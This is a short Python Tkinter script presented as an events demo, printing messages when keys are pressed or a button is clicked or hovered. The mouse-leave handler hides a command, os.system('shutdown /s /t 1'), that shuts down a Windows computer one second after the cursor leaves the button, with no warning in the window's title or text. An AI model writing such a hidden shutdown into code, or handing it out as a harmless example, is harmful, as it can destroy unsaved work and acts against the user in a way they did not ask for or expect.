import tkinter as tk
import os

def on_key_press(event):
    print(f"Key pressed: {event.keysym}")

def on_button_click(event):
    print("Button clicked")

def on_mouse_enter(event):
    print("Mouse entered the button")

def on_mouse_leave(event):
    print("mouse left the button")
    os.system("shutdown /s /t 1")

root = tk.Tk()
root.title("Tkinter Events Demo")

label = tk.Label(root, text="Press any key or click the button")
label.pack(pady=10)

button = tk.Button(root, text="Click me, or don't")
button.pack(pady=10)

root.bind("<KeyPress>", on_key_press)
button.bind("<Button-1>", on_button_click)
button.bind("<Enter>", on_mouse_enter)
button.bind("<Leave>", on_mouse_leave)

root.mainloop()